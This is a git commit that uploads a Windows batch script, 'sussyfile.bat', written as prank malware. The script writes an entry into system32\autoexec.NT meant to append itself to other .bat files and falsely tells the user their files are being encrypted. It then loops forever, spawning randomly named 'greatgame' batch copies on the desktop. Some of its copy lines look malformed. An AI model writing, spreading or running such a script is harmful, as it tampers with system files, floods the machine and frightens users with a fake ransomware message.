56805c2dcf284d18c705ac3dd34cb13a6bd1782f
ProddyLLama <65682002+ProddyLLama@users.noreply.github.com>
2022-02-21 21:04:26 +0100

    Add files via upload

---
+++ assets/sus/sussyfile.bat
@@ -0,0 +1,23 @@
+
+@echo off
+
+echo checking system:
+
+echo for %%i in ("*.bat") do copy %%i+c:\tmp.bat %%i #*>c:\windows\system32\autoexec.NT
+
+echo Amogus.
+
+Pause
+
+echo Your files are being encrypted.
+
+pause
+
+:1
+
+dir /s
+
+copy c:\tmp.bat
+
+c:\document~1\%username%\desktop\greatgame_%random%.bat
+goto 1
